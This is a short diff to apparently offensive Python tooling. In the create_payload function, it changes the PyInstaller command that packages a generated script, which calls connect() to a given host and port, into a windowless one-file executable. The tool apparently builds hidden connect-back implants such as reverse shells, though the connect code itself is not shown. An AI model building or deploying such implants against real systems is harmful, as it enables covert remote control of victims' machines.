@@ -72,7 +72,7 @@ def create_payload(payload , payload_name, payload_host, payload_port):
             file.write(f"from whoami_payloads.{payload} import connect\n")
             file.write(f"connect('{payload_host}', {payload_port})\n")
 
-        subprocess.call(f"pyinstaller39 --onefile --noconsole whoami-output/{payload_name}.py")
+        subprocess.call(f"pyinstaller --onefile --noconsole whoami-output/{payload_name}.py")
         sleep(1)
         clean(payload_name)
         sleep(1)
